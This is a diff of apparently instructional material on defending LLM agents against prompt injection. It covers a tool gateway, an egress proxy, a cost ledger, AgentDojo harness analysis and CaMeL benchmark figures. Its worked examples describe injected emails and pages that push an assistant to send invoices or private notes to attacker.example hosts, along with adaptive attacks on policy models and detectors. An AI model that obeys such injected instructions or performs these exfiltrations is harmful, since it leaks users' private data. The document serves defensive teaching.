-A tool gateway sits between model and tools. For each call it checks: (1) scope—is this tool and object within the capability granted for this task? (2) provenance—did arguments (recipient, URL, amount) come from the trusted user query or from untrusted data? (3) risk—does the action need explicit confirmation? (4) budget—does the reservation fit the authenticated principal's ledger (Lesson 18.5)? Arguments tainted by untrusted data cannot choose high-risk targets without confirmation. Control/data separation takes this further: the plan comes only from trusted input; untrusted data may fill values but cannot add steps.
+A tool gateway sits between model and tools and checks every proposed call in order:
 
-What the guarantee covers must be read from the design, not from the headline. CaMeL's stated threat model excludes attacks that change only the text shown to the user, and its authors report side channels and leave formal verification of the interpreter to future work (EC-4). A gateway has the same shape of limit: it constrains actions, and it does not make a summary truthful.
+```mermaid
+flowchart LR
+    M["model proposes<br/>tool call"] --> S{"1 scope:<br/>tool + object within<br/>task capability?"}
+    S -- no --> D["DENY + audit"]
+    S -- yes --> P{"2 provenance:<br/>arguments from trusted<br/>user query?"}
+    P -- "tainted, high-risk target" --> C{"explicit target<br/>confirmation?"}
+    C -- no --> D
+    C -- yes --> R
+    P -- "trusted / permitted data" --> R{"3 risk:<br/>needs explicit<br/>confirmation?"}
+    R -- "yes, not confirmed" --> D
+    R -- "no / confirmed" --> B{"4 budget:<br/>reservation fits<br/>principal ledger?"}
+    B -- no --> D
+    B -- yes --> X["dispatch + audit"]
+```
+
+- Legend: scope = capability granted for this task; provenance = whether arguments (recipient, URL, amount) came from the trusted user query or from untrusted data; ledger = the authenticated principal's reservation ledger (Lesson 18.5).
+- Arguments tainted by untrusted data cannot choose high-risk targets without explicit confirmation. Confirmation does not bypass the remaining risk or budget checks.
+- Control/data separation takes this further: the plan comes only from trusted input; untrusted data may fill values but cannot add steps.
+
+What the guarantee covers must be read from the design, not from the headline:
+- CaMeL's stated threat model excludes attacks that change only the text shown to the user, and its authors report side channels and leave formal verification of the interpreter to future work (EC-4).
+- A gateway has the same shape of limit: it constrains actions, and it does not make a summary truthful.
 
 **Quantitative Model / Trade-off Comparison:**
-Report each configuration as (benign utility, utility under attack, ASR), with the attack protocol stated. For CaMeL, $84.5\%\to77.3\%$ on 97 user tasks is 82 → 75 tasks, a cost of 7 tasks for that model on that benchmark (**D** from the reported percentages; $0.845\times97=81.97\approx82$ and $0.773\times97=74.98\approx75$). The same design costs another model in the same table 32 points, including a fall from 60% to 0% on the travel suite. Your cost depends on how often tasks need untrusted data to choose the next action, and on how well the planning model handles undocumented tool outputs. Hypothesis to test (**H**, CLM-015): cutting one leg of source–sensitive data–sink removes more adaptive exfiltration than adding another detector at matched utility cost.
+Report each configuration as (benign utility, utility under attack, ASR), with the attack protocol stated.
+- For CaMeL, $84.5\%\to77.3\%$ on 97 user tasks is 82 → 75 tasks, a cost of 7 tasks for that model on that benchmark (**D** from the reported percentages):
+  - $0.845\times97=81.97\approx82$.
+  - $0.773\times97=74.98\approx75$.
+- The same design costs another model in the same table 32 points, including a fall from 60% to 0% on the travel suite.
+- Your cost depends on how often tasks need untrusted data to choose the next action, and on how well the planning model handles undocumented tool outputs.
+- Hypothesis to test (**H**, CLM-015): cutting one leg of source–sensitive data–sink removes more adaptive exfiltration than adding another detector at matched utility cost.
 
 **Attack-to-Defense Analysis for Agent Channels** (attack and paper-defense columns **O** from cards EC-3 and EC-6 to EC-14; control column **D**, CLM-032; any claim that a control holds under adaptive attack is **H**, CLM-033):
 
-Each row asks the source–sink questions of Lesson 18.1: which untrusted source, which sink, whose authority, and which assumption the attack breaks. The "Paper-evaluated defense" column reports only what the cited authors measured, inside their scope. The derived controls are this module's derivation. None of them has been evaluated here.
+- Each row asks the source–sink questions of Lesson 18.1: which untrusted source, which sink, whose authority, and which assumption the attack breaks.
+- The "Paper-evaluated defense" column reports only what the cited authors measured, inside their scope.
+- The derived controls are this module's derivation. None of them has been evaluated here.
 
 | Attack class (card) | Source → sink, authority | Assumption broken | Paper-evaluated defense (**O**) | Derived control (**D**) | Residual risk | Sandbox test and adaptive budget |
 |---|---|---|---|---|---|---|
@@ -338,12 +514,21 @@ Each row asks the source–sink questions of Lesson 18.1: which untrusted source
 | Adaptive attack against an out-of-band policy (EC-12) | Any untrusted source → policy-mediated tool calls | A policy model or monitor cannot itself be steered | One defense held against one hand-crafted adaptive template on a 7B model (25.8% → 4.2% → 2.6% ASR), with utility about 45% → 26% | Policy authoring and provenance assignment are trusted components and must not read untrusted text | An optimized attack on the policy model; a wrong provenance label | Attack the policy layer directly with a stated optimization budget. Report utility beside ASR |
 
 How to read the table:
-- **The derived controls share one assumption** (CLM-032): authority is decided by components that read only authenticated principal, task capability, reviewed manifests, and recorded provenance. They never read the untrusted text itself. If provenance is mislabelled, if a reviewed tool is itself malicious, or if the requested task genuinely needs untrusted data to choose the action, the control does not cover the case.
-- **Stating that a row's control works under adaptive attack would be a hypothesis, not a result** (**H**, CLM-033). The prediction is that, at matched benign utility, these deterministic checks keep the unauthorized-dispatch rate under adaptive attack below the rate for a detector-only configuration. The measurement is the sandbox test in each row. The falsifier is any adaptive run in which a call outside capability is dispatched, or in which the detector-only configuration reaches an equal or lower rate at equal utility.
+- **The derived controls share one assumption** (CLM-032): authority is decided by components that read only authenticated principal, task capability, reviewed manifests, and recorded provenance. They never read the untrusted text itself. The control does not cover the case if:
+  - provenance is mislabelled;
+  - a reviewed tool is itself malicious; or
+  - the requested task genuinely needs untrusted data to choose the action.
+- **Stating that a row's control works under adaptive attack would be a hypothesis, not a result** (**H**, CLM-033).
+  - Prediction: at matched benign utility, these deterministic checks keep the unauthorized-dispatch rate under adaptive attack below the rate for a detector-only configuration.
+  - Measurement: the sandbox test in each row.
+  - Falsifier: any adaptive run in which a call outside capability is dispatched, or in which the detector-only configuration reaches an equal or lower rate at equal utility.
 - **Numbers in the table are from different papers, agents, denominators, and attack strengths.** They show that each channel exists and what was tried against it. They do not rank the channels.
 
 **Worked Example** (a design walk-through; no measurement):
-- *Input.* User request: "Summarize my latest invoice email." The email body contains a sentence asking the assistant to forward all invoices to `billing@attacker.example`. The task capability grants `read_email` on the user's inbox and nothing else.
+- *Input.*
+  - User request: "Summarize my latest invoice email."
+  - The email body contains a sentence asking the assistant to forward all invoices to `billing@attacker.example`.
+  - The task capability grants `read_email` on the user's inbox and nothing else.
 - *Steps.* The model proposes `send_email(to="billing@attacker.example", …)`. The gateway evaluates, in order:
 
 | Check | Evidence the gateway uses | Decision |
@@ -401,8 +586,30 @@ Apply the interpreter's standard defense: HTML encoding and CSP for rendering; p
 
 *Egress policy proxy* (**D**, CLM-018). The proxy is the control. Query-string stripping is a supplement that narrows one channel. The proxy must enforce, in this order:
 
+```mermaid
+flowchart TD
+    REQ["URL from renderer / fetch tool / sandbox<br/>(1 single path: proxy is the only route)"] --> DEST{"2 destination:<br/>scheme, port, exact host<br/>on allowlist? (before lookup)"}
+    DEST -- no --> DENY["DENY<br/>(no lookup, no connection)"]
+    DEST -- yes --> RES{"3 resolution:<br/>operator resolver; address not<br/>loopback / link-local / private / metadata?"}
+    RES -- no --> DENY
+    RES -- yes --> SHAPE["5 request shaping:<br/>no cookies/credentials, fixed method,<br/>no referrer, size/type limits"]
+    SHAPE --> CONN["connect to checked address"]
+    CONN --> REDIR{"4 redirect?"}
+    REDIR -- "yes: Location = new request" --> DEST
+    REDIR -- no --> DONE["response"]
+    DENY --> AUD["6 audit every allow/deny"]
+    DONE --> AUD
+```
+
+- Legend: numbers match the steps below; a redirect re-enters step 2 subject to a small hop limit, or is refused outright.
+
 1. **Single path.** The renderer's content security policy allows images and fetches only from the proxy origin, and the fetch tool and sandbox have no other route. A URL the proxy never sees is outside the policy.
-2. **Authorized destination, decided before any lookup.** Parse the URL once with one parser. Require an allowed scheme and port. Compare the host by exact match against an allowlist of named destinations. Reject user-info, IP literals, and hosts that match only by suffix or substring. The decision comes first because resolving an unauthorized name is already egress: the lookup itself reaches a name server the attacker may run.
+2. **Authorized destination, decided before any lookup.**
+   - Parse the URL once with one parser.
+   - Require an allowed scheme and port.
+   - Compare the host by exact match against an allowlist of named destinations.
+   - Reject user-info, IP literals, and hosts that match only by suffix or substring.
+   - The decision comes first because resolving an unauthorized name is already egress: the lookup itself reaches a name server the attacker may run.
 3. **Resolution policy.** The proxy resolves allowed names itself, with a resolver the operator controls. It rejects answers in loopback, link-local, private, and metadata ranges, and it connects to the address it checked, so the name cannot resolve differently between check and use.
 4. **Redirect policy.** The proxy does not follow redirects automatically. Each `Location` is a new request that goes through steps 2–3, with a small hop limit, or redirects are refused outright.
 5. **Request shaping (supplement).** No cookies or credentials, a fixed method, no referrer, and size and content-type limits. Strip the query string, or allow only named parameters, for destinations that do not need it.
@@ -412,7 +619,10 @@ These steps follow general server-side request forgery guidance: validate agains
 
 Why stripping alone fails: the same bytes can be carried in the path, in a subdomain label, or in the target of a redirect issued by a host that is itself allowed. Stripping also does nothing about the fact that a request reached an unauthorized host at all.
 
-*Consumption limits.* AgentDojo's `ToolsExecutionLoop` stops after `max_iters` iterations (default 15). In the same file, `ToolsExecutor.query` runs every tool call present in the assistant message, and nothing there counts tokens or cost (**O**, CLM-014). An iteration cap is therefore not a spend bound: it limits one factor and leaves fan-out, retries, and context size open.
+*Consumption limits.*
+- AgentDojo's `ToolsExecutionLoop` stops after `max_iters` iterations (default 15).
+- In the same file, `ToolsExecutor.query` runs every tool call present in the assistant message, and nothing there counts tokens or cost (**O**, CLM-014).
+- An iteration cap is therefore not a spend bound: it limits one factor and leaves fan-out, retries, and context size open.
 
 **Quantitative Model / Derivation** (**D**, CLM-017):
 The expression $N_{iter}\times(C_{call}+C_{tool})$ "plus context growth" is an **estimate**. It becomes a bound only if every one of these has an enforced maximum:
@@ -432,20 +642,53 @@ $$
 C_{max}=N\,(T_{in,max}\,p_{in}+T_{out,max}\,p_{out})+N\,F\,(1+k_s)\,c_{tool}.
 $$
 
-*where:* $N$ is the maximum number of model calls per episode; $T_{in,max}$, $T_{out,max}$ are the per-call input and output token caps; $p_{in}$, $p_{out}$ are USD per token; $F$ is the maximum tool calls per iteration; $k_s$ is the maximum SDK retries per tool call, so $1+k_s$ is the maximum physical attempts; $c_{tool}$ is the maximum price of one attempt. $N_{iter}$, $C_{call}$, $C_{tool}$ in the estimate are typical iterations, typical cost per model call, and typical tool cost per iteration.
+*where:*
+- $C_{max}$: worst-case episode cost (USD).
+- $N$: maximum number of model calls per episode.
+- $T_{in,max}$, $T_{out,max}$: per-call input and output token caps (tokens).
+- $p_{in}$, $p_{out}$: price per input / output token (USD per token).
+- $F$: maximum tool calls per iteration.
+- $k_s$: maximum SDK retries per tool call, so $1+k_s$ is the maximum physical attempts.
+- $c_{tool}$: maximum price of one tool attempt (USD).
+- $N_{iter}$, $C_{call}$, $C_{tool}$ (in the estimate): typical iterations, typical cost per model call (USD), and typical tool cost per iteration (USD).
 
-*Step-by-step.* (1) One model call costs at most $T_{in,max}p_{in}+T_{out,max}p_{out}$; there are at most $N$ calls. (2) Each iteration follows one model call, so there are at most $N$ iterations, each with at most $F$ tool calls of at most $1+k_s$ attempts at most $c_{tool}$ each: $N\,F\,(1+k_s)\,c_{tool}$. (3) Adding the two worst cases gives $C_{max}$. Every factor is a maximum, so no episode can exceed it; drop any one cap and that factor, hence the product, is unbounded.
+*Step-by-step.*
+1. One model call costs at most $T_{in,max}p_{in}+T_{out,max}p_{out}$; there are at most $N$ calls.
+2. Each iteration follows one model call, so there are at most $N$ iterations, each with at most $F$ tool calls of at most $1+k_s$ attempts at most $c_{tool}$ each: $N\,F\,(1+k_s)\,c_{tool}$.
+3. Adding the two worst cases gives $C_{max}$. Every factor is a maximum, so no episode can exceed it; drop any one cap and that factor, hence the product, is unbounded.
 
 *Symbol note.* In this lesson $C$ and $R$ are ledger amounts (committed and reserved USD) and $T_{in}$, $T_{out}$ are token counts; they are unrelated to the events $R$ and $T$ of Lesson 18.2, and $k_s$, $k_c$ are retry counts, not the retrieval top-$k$.
 
 If any one is not enforced, $C_{max}$ is not a bound and must be labelled an estimate. The classification of hard and estimated resources is the one in Module 12, Lesson 12.3: cost is hard only if every billed token is covered by the exact input count and the output cap, and every tool has a per-attempt price cap.
 
-The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$, reserved $R$, invariant $C+R\le B$, reservation of the worst case before dispatch, atomic admission, reconciliation afterwards. Under that invariant, spend is at most $B$ whatever the model proposes.
+The enforced form is the Module 12 reservation ledger:
+- limit $B$, committed $C$, reserved $R$ (all USD);
+- invariant $C+R\le B$;
+- reservation of the worst case before dispatch, atomic admission, reconciliation afterwards.
 
-*How one action is admitted.* Before dispatch, compute the worst-case reservation $q$ of the action. Admit only if $C+R+q\le B$; then $R\leftarrow R+q$. After the action finishes with actual cost $a\le q$: $R\leftarrow R-q$, $C\leftarrow C+a$, and the refund is $q-a$. Since actual spend $C$ never exceeds $C+R$, and $C+R\le B$ at every step, spend stays at most $B$. With two ledgers (episode and principal), the check must pass in both, in one atomic step. Module 18 adds two security requirements that Module 12 does not need:
+Under that invariant, spend is at most $B$ whatever the model proposes.
+
+*How one action is admitted.*
+
+```mermaid
+flowchart LR
+    Q["compute worst-case<br/>reservation q"] --> CHK{"C + R + q ≤ B<br/>in episode AND<br/>principal ledger?<br/>(one atomic step)"}
+    CHK -- no --> REJ["REJECT before dispatch"]
+    CHK -- yes --> RSV["R ← R + q"] --> RUN["dispatch; actual cost a ≤ q"] --> REC["R ← R − q<br/>C ← C + a<br/>refund q − a"]
+```
+
+- Legend: $q$ = worst-case reservation of the action; $a$ = actual cost; $B$, $C$, $R$ = limit, committed, reserved (USD).
+- Since actual spend $C$ never exceeds $C+R$, and $C+R\le B$ at every step, spend stays at most $B$.
+- With two ledgers (episode and principal), the check must pass in both, in one atomic step.
+
+Module 18 adds two security requirements that Module 12 does not need:
 
 1. **The ledger key is the authenticated principal.** It comes from the verified session at the gateway. It is never taken from model output, a tool argument, a retrieved document, or a client-supplied field, because attacker-written text can set all of those.
-2. **There is a per-principal limit across episodes.** An episode budget alone resets whenever a new episode starts, so an attacker who can trigger episodes multiplies it. Each admission must satisfy the episode ledger and the principal's window ledger (for example, per day) in one atomic step. Parallel episodes of one principal share the same principal ledger. Traffic with no authenticated principal draws from a shared pool with its own limit.
+2. **There is a per-principal limit across episodes.**
+   - An episode budget alone resets whenever a new episode starts, so an attacker who can trigger episodes multiplies it.
+   - Each admission must satisfy the episode ledger and the principal's window ledger (for example, per day) in one atomic step.
+   - Parallel episodes of one principal share the same principal ledger.
+   - Traffic with no authenticated principal draws from a shared pool with its own limit.
 
 **Worked Example A — an injected fetch loop against the ledger** (synthetic prices and counts, registry CLM-020; not any provider's price list):
 - *Input.*
@@ -454,11 +697,23 @@ The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$,
   - Budgets: episode $B_{ep}=0.40$ USD; principal $B_{pr}=1.00$ USD per day, with 0.70 already committed by this principal's earlier episodes today.
   - A retrieved page tells the agent to keep fetching every linked page.
 - *Step 1 — estimate against bound.*
-  - A typical-case estimate with 4,000 input and 500 output tokens per call and one fetch per iteration: $5\times(0.0195+0.01)=0.1475$ USD. Here $0.0195=4{,}000\times3/10^6+500\times15/10^6=0.012+0.0075$, and $0.01$ is one fetch attempt.
-  - The bound under the caps: $5\times(0.060+0.015)+5\times3\times3\times0.01=0.375+0.45=0.825$ USD. Mapping to $C_{max}$: $T_{in,max}p_{in}=20{,}000\times3/10^6=0.060$; $T_{out,max}p_{out}=1{,}000\times15/10^6=0.015$; $N\,F\,(1+k_s)\,c_{tool}=5\times3\times(1+2)\times0.01$.
+  - Typical-case estimate (4,000 input and 500 output tokens per call, one fetch per iteration):
+    - Per call: $4{,}000\times3/10^6+500\times15/10^6=0.012+0.0075=0.0195$ USD.
+    - One fetch attempt: $0.01$ USD.
+    - Episode: $5\times(0.0195+0.01)=0.1475$ USD.
+  - Bound under the caps, mapped to $C_{max}$:
+    - $T_{in,max}p_{in}=20{,}000\times3/10^6=0.060$.
+    - $T_{out,max}p_{out}=1{,}000\times15/10^6=0.015$.
+    - $N\,F\,(1+k_s)\,c_{tool}=5\times3\times(1+2)\times0.01=0.45$.
+    - Total: $5\times(0.060+0.015)+0.45=0.375+0.45=0.825$ USD.
   - Used as a ceiling, the estimate is 5.6 times too low ($0.825/0.1475\approx5.6$). The bound itself (0.825) is above the episode budget (0.40), so the caps alone do not keep the episode inside its budget. The ledger does.
 - *Step 2 — ledger trace.* $C_{ep}$ and $C_{pr}$ are committed cost in USD after the row.
-  - *How to read a row.* A model-call reservation is (exact input count) $\times p_{in}$ $+$ $T_{out,max}\times p_{out}$, because input is counted before dispatch but output is known only afterwards. Row 1: $6{,}000\times3/10^6=0.018$ plus $1{,}000\times15/10^6=0.015$, so $q=0.033$. Actual with 400 output tokens: $0.018+400\times15/10^6=0.018+0.006=0.024$; refund $0.033-0.024=0.009$. The "Check" column is $C+R+q$ for the ledger that is closest to its limit, including any still-open reservations (row 6c: $0.9315+0.06+0.03=1.0215$).
+  - *How to read a row.*
+    - A model-call reservation is (exact input count) $\times p_{in}$ $+$ $T_{out,max}\times p_{out}$, because input is counted before dispatch but output is known only afterwards.
+    - Row 1 reservation: $6{,}000\times3/10^6=0.018$ plus $1{,}000\times15/10^6=0.015$, so $q=0.033$.
+    - Row 1 actual (400 output tokens): $0.018+400\times15/10^6=0.018+0.006=0.024$.
+    - Row 1 refund: $0.033-0.024=0.009$.
+    - The "Check" column is $C+R+q$ for the ledger that is closest to its limit, including any still-open reservations (row 6c: $0.9315+0.06+0.03=1.0215$).
 
 | # | Proposed action | Reservation $q$ | Check | Decision | Actual | $C_{ep}$ / $C_{pr}$ |
 |---|---|---|---|---|---|---|
@@ -479,8 +734,13 @@ The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$,
 - *Result.* Three model calls, 10 fetch attempts, 0.2515 USD in the episode, 0.9515 USD for the principal's day. Four proposed actions were refused before dispatch, each with the resource that failed.
 - *Reading the trace as four tests.*
   - **Multi-tool iteration** (rows 2a–2d): one iteration asked for four tools. The simple product assumes one.
-  - **Nested retry** (row 2e): one logical fetch used 3 physical attempts. The reservation already covered them. With a controller retry on top ($k_c=2$), one logical fetch could reach $2\times(1+2)=6$ attempts, and each controller attempt needs its own reservation. (Here $k_c=2$ counts controller *attempts*, one original plus one retry. In the $1+k$ convention used for $k_s$, that is one controller retry; the general count is (controller attempts) $\times(1+k_s)$, and with two controller *retries* it would be $3\times3=9$.)
-  - **Context growth** (rows 3, 5a, 5b): the input went from 6,000 to 18,000 to 31,000 tokens. The reservation grew with it, and the call that exceeded the token cap was refused, although its cost (0.108 USD) would still have fitted the principal's budget ($31{,}000\times3/10^6+0.015=0.108$; $0.867+0.108=0.975\le1.00$).
+  - **Nested retry** (row 2e): one logical fetch used 3 physical attempts. The reservation already covered them.
+    - With a controller retry on top ($k_c=2$), one logical fetch could reach $2\times(1+2)=6$ attempts, and each controller attempt needs its own reservation.
+    - Here $k_c=2$ counts controller *attempts*, one original plus one retry. In the $1+k$ convention used for $k_s$, that is one controller retry.
+    - General count: (controller attempts) $\times(1+k_s)$; with two controller *retries* it would be $3\times3=9$.
+  - **Context growth** (rows 3, 5a, 5b): the input went from 6,000 to 18,000 to 31,000 tokens. The reservation grew with it, and the call that exceeded the token cap was refused, although its cost would still have fitted the principal's budget:
+    - Cost: $31{,}000\times3/10^6+0.015=0.108$ USD.
+    - Principal: $0.867+0.108=0.975\le1.00$.
   - **Budget rejection** (rows 6c, 7): the episode ledger had room both times. Only the principal ledger stopped the loop.
 - *Interpretation and limits.*
   - With an episode-only key, the attacker restarts and receives a fresh 0.40 USD each time: ten episodes are 4.00 USD. With the principal ledger, 0.0485 USD remains for the day ($1.00-0.9515$). A new episode's first call (reservation 0.033) is admitted and its next action is not.
@@ -489,7 +749,12 @@ The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$,
   - The cost column is hard only because every price in this fixture is capped by a controller-set parameter.
 
 **Worked Example B — egress through a rendered image** (sandbox fixture; reserved names and a canary value, no real secret or endpoint):
-- *Input.* A chat UI renders Markdown. An injected page makes the model emit an image reference whose URL points at `collect.attacker.example` and carries a summary of the user's private notes. In the sandbox the notes contain the canary `CANARY-7F3A`. The sandbox resolver and listeners are the only things that answer for `attacker.example` and `cdn.allowed.example`. The allowlist contains `cdn.allowed.example` only.
+- *Input.*
+  - A chat UI renders Markdown.
+  - An injected page makes the model emit an image reference whose URL points at `collect.attacker.example` and carries a summary of the user's private notes.
+  - In the sandbox the notes contain the canary `CANARY-7F3A`.
+  - The sandbox resolver and listeners are the only things that answer for `attacker.example` and `cdn.allowed.example`.
+  - The allowlist contains `cdn.allowed.example` only.
 - *Steps.* Run each case under two configurations and read the sandbox resolver log and listener logs.
 
 | Case | Where the canary is carried | Strip-query-only configuration | Policy proxy (steps 1–6) |
@@ -507,7 +772,9 @@ The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$,
 - *Result.* Under the policy proxy, the unauthorized listener and the resolver for the unauthorized zone record zero requests in E1–E5, and C0 still renders. Under strip-query-only, E2–E5 deliver the canary to a destination that was never authorized, and E1 still contacts one.
 - *Interpretation and limits.*
   - E1 under strip-only is not a pass. The request itself tells the unauthorized host that the user opened this content, and when.
-  - E7 is the residual risk. An allowed destination still receives whatever the path carries. If that destination has attacker-readable storage, logs, or a redirect of its own, data leaves through an authorized door. The allowlist therefore names specific hosts that the operator controls or has reviewed. Path patterns are constrained where the destination permits it.
+  - E7 is the residual risk. An allowed destination still receives whatever the path carries.
+    - If that destination has attacker-readable storage, logs, or a redirect of its own, data leaves through an authorized door.
+    - The allowlist therefore names specific hosts that the operator controls or has reviewed. Path patterns are constrained where the destination permits it.
   - Request count and timing remain a low-bandwidth channel to any allowed host.
   - The proxy governs network egress only. `send_email` and other tool sinks are governed by the gateway of Lesson 18.4.
   - C1 matters: without a control in which the leak is observed, zero requests could mean a broken listener.
@@ -526,7 +793,12 @@ The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$,
   - Knowledge Check 1: a schema-valid output can still be a valid request to do the wrong thing. Validation checks form, and the sink needs authorization and encoding.
   - Knowledge Check 2: tool fan-out per iteration, inner retries, and context growth per call. Also output length if uncapped.
   - Knowledge Check 3: path and subdomain label, or a redirect target. Destination authorization before lookup and a redirect policy stop them. Stripping does not.
-  - Guided Practice 1: every $C_{pr}$ is 0.20 lower. Row 6c is now admitted (principal $0.7315+0.09=0.8215\le1.00$). Assuming that fetch also takes one attempt, row 6d ends at 0.2615 / 0.7615. Row 7 is admitted: episode $0.2615+0.0735=0.335\le0.40$ and principal $0.835\le1.00$. The loop then runs on until the model-call cap or the episode budget stops it. The fan-out and token-cap rejections (2d, 5a) do not change, because they do not depend on the budget.
+  - Guided Practice 1: every $C_{pr}$ is 0.20 lower.
+    - Row 6c is now admitted (principal $0.7315+0.09=0.8215\le1.00$).
+    - Assuming that fetch also takes one attempt, row 6d ends at 0.2615 / 0.7615.
+    - Row 7 is admitted: episode $0.2615+0.0735=0.335\le0.40$ and principal $0.835\le1.00$.
+    - The loop then runs on until the model-call cap or the episode budget stops it.
+    - The fan-out and token-cap rejections (2d, 5a) do not change, because they do not depend on the budget.
   - Guided Practice 2: no ambient credentials, CPU/memory/time limits, a scratch filesystem, network only through the policy proxy, outputs returned as untrusted text.
 - *Common Failure*: Sandboxing code but allowing unrestricted network egress; calling an iteration cap a cost ceiling; treating "the proxy strips query strings" as the control; keying the budget by a field the client or the model can set.
 - *Diagnostic Hint*: Where can bytes leave the system, including a name lookup? For the ledger: which factor in your ceiling has no enforced maximum, and who decides the key?
@@ -561,15 +833,40 @@ At `ethz-spylab/agentdojo` commit `089ed468cf3ed0322acc66b0211f26d9d90dbf60` (st
 4. `PromptInjectionDetector.query` checks trailing tool messages per message or over the full conversation. Detection replaces text with `<Data omitted because a prompt injection was detected>` or raises `AbortAgentError`; `run_task_with_pipeline` catches that error and scores the state reached.
 5. `ToolsExecutionLoop.query` repeats while the last assistant message has tool calls, up to `max_iters` (default 15). `ToolsExecutor.query` runs every tool call in that message. These files do not bound tokens or cost.
 
+```mermaid
+flowchart TD
+    BS["benchmark_suite_with_injections"] --> IT["run each injection task<br/>as a user task"]
+    BS --> RT["run_task_with_injection_tasks<br/>(per user task)"]
+    RT --> RP["TaskSuite.run_task_with_pipeline<br/>per (user task, injection task)"]
+    RP --> LOOP["ToolsExecutionLoop.query<br/>≤ max_iters (15)"]
+    LOOP --> EX["ToolsExecutor.query<br/>runs every tool call"]
+    LOOP --> DET["PromptInjectionDetector.query<br/>redact or AbortAgentError"]
+    RP --> OUT["(utility, security)<br/>security True = injection goal executed"]
+    OUT --> AGG["aggregate_results<br/>mean over pairs"]
+```
+
+- Legend: `security` mean = targeted ASR; on context-length or server error the pair records `utility = False`, `security = True`.
+
 Lesson: utility and attack success are separate outcomes. An abort can lower ASR and utility together.
 
 **Quantitative Model / Trade-off Comparison** (**D**, CLM-019):
-Compare rows only when they share the model and harness manifest, benign task set, security cases, and attack protocol. A static protocol names its fixed attacks. An adaptive protocol names method, queries per case, attacker knowledge, and feedback. Every configuration, including no added defense, gets both columns.
+Compare rows only when they share the model and harness manifest, benign task set, security cases, and attack protocol.
+- A static protocol names its fixed attacks.
+- An adaptive protocol names method, queries per case, attacker knowledge, and feedback.
+- Every configuration, including no added defense, gets both columns.
 
-For vector (benign utility ↑, utility under attack ↑, static ASR ↓, adaptive ASR ↓), check dominance pairwise. The arrows give the better direction: ↑ means higher is better, ↓ means lower is better. To check whether X dominates Y, compare each metric in its own direction; X dominates only if it is never worse and at least once strictly better. If several points remain, choose by a predeclared objective. Saying "X dominates" while X is worse on one declared metric is an arithmetic error.
+For vector (benign utility ↑, utility under attack ↑, static ASR ↓, adaptive ASR ↓), check dominance pairwise:
+- The arrows give the better direction: ↑ means higher is better, ↓ means lower is better.
+- To check whether X dominates Y, compare each metric in its own direction; X dominates only if it is never worse and at least once strictly better.
+- If several points remain, choose by a predeclared objective.
+- Saying "X dominates" while X is worse on one declared metric is an arithmetic error.
 
 **Worked Example** (synthetic counts, registry CLM-020; no system was measured):
-- *Input.* One model and manifest; 100 benign tasks; 400 security cases. Static protocol: fixed templates, one attempt per case. Adaptive protocol: search with 200 queries per case and gateway/detector decisions visible. Objective fixed in advance: benign utility ≥75%, adaptive ASR@200 ≤10%, then maximize utility under attack.
+- *Input.*
+  - One model and manifest; 100 benign tasks; 400 security cases.
+  - Static protocol: fixed templates, one attempt per case.
+  - Adaptive protocol: search with 200 queries per case and gateway/detector decisions visible.
+  - Objective fixed in advance: benign utility ≥75%, adaptive ASR@200 ≤10%, then maximize utility under attack.
 
 | Config | Benign utility (of 100) | Utility under attack (of 400) | Static ASR (of 400) | Adaptive ASR@200 (of 400) |
 |---|---:|---:|---:|---:|
@@ -577,12 +874,28 @@ For vector (benign utility ↑, utility under attack ↑, static ASR ↓, adapti
 | B — abort on detect | 78 (78%) | 120 (30%) | 16 (4%) | 140 (35%) |
 | C — gateway with taint rules | 76 (76%) | 280 (70%) | 12 (3%) | 20 (5%) |
 
-- *Step 1 — dominance.* C beats A and B on attack-time utility and both ASRs, but loses on benign utility (76 < 80 and 78). A beats B on utilities and loses on ASRs. No configuration dominates another; all three are on the frontier.
+- *Step 1 — dominance.*
+  - C beats A and B on attack-time utility and both ASRs, but loses on benign utility (76 < 80 and 78).
+  - A beats B on utilities and loses on ASRs.
+  - No configuration dominates another; all three are on the frontier.
 - *Step 2 — objective.* A and B fail the 10% adaptive-ASR ceiling. C passes both constraints and is the only feasible point.
 - *Result.* Ship C under this objective, with its cost stated: 4 fewer benign tasks solved than A out of 100.
-- *Interpretation and limits.* C is chosen by objective, not dominance. At a benign floor of 78%, nothing is feasible: do not ship under that objective. On a vector that silently drops benign utility, C would dominate; that is a different question. A's adaptive result is required as baseline. The 5% result means only that this search found success on 20 of 400 cases at budget 200; it is no guarantee at a stronger budget. Whether 76 versus 80 is real needs the paired analysis in Module 15.
+- *Interpretation and limits.*
+  - C is chosen by objective, not dominance.
+  - At a benign floor of 78%, nothing is feasible: do not ship under that objective.
+  - On a vector that silently drops benign utility, C would dominate; that is a different question.
+  - A's adaptive result is required as baseline.
+  - The 5% result means only that this search found success on 20 of 400 cases at budget 200; it is no guarantee at a stronger budget.
+  - Whether 76 versus 80 is real needs the paired analysis in Module 15.
 
-*Author-reported comparison.* AgentDojo Table 5 reports, for GPT-4o under its built-in static attack, (benign utility, utility under attack, targeted ASR): no defense 69.0/50.0/57.7; delimiting 72.7/55.6/41.7; injection detector 41.5/21.1/8.0; repeated prompt 85.5/67.3/27.8; tool filter 73.1/56.3/6.8 (EC-5). Tool filter dominates no defense, delimiting, and detector on this three-metric vector. Repeated prompt and tool filter trade utility against ASR. This table says nothing about adaptive attack.
+*Author-reported comparison.* AgentDojo Table 5 reports, for GPT-4o under its built-in static attack, (benign utility, utility under attack, targeted ASR) (EC-5):
+- no defense 69.0/50.0/57.7;
+- delimiting 72.7/55.6/41.7;
+- injection detector 41.5/21.1/8.0;
+- repeated prompt 85.5/67.3/27.8;
+- tool filter 73.1/56.3/6.8.
+
+Tool filter dominates no defense, delimiting, and detector on this three-metric vector. Repeated prompt and tool filter trade utility against ASR. This table says nothing about adaptive attack.
 
 **Knowledge Check:**
 1. Why must ASR be reported with utility under attack?
@@ -676,8 +989,13 @@ Papers quoted with a number were opened in full text (arXiv HTML) on 2026-10-01.
 - *System*: privileged planner, quarantined model without tool access, custom data-flow interpreter, policies before each tool call.
 - *Tasks/denominator*: AgentDojo; 97 benign tasks and 949 attack cases. AgentDojo v3 reports 629; the CaMeL v2 text does not state which AgentDojo suite version produced 949 (full text re-searched 2026-11-09).
 - *Attacker knowledge/budget*: AgentDojo built-in attack; no adaptive attack against CaMeL.
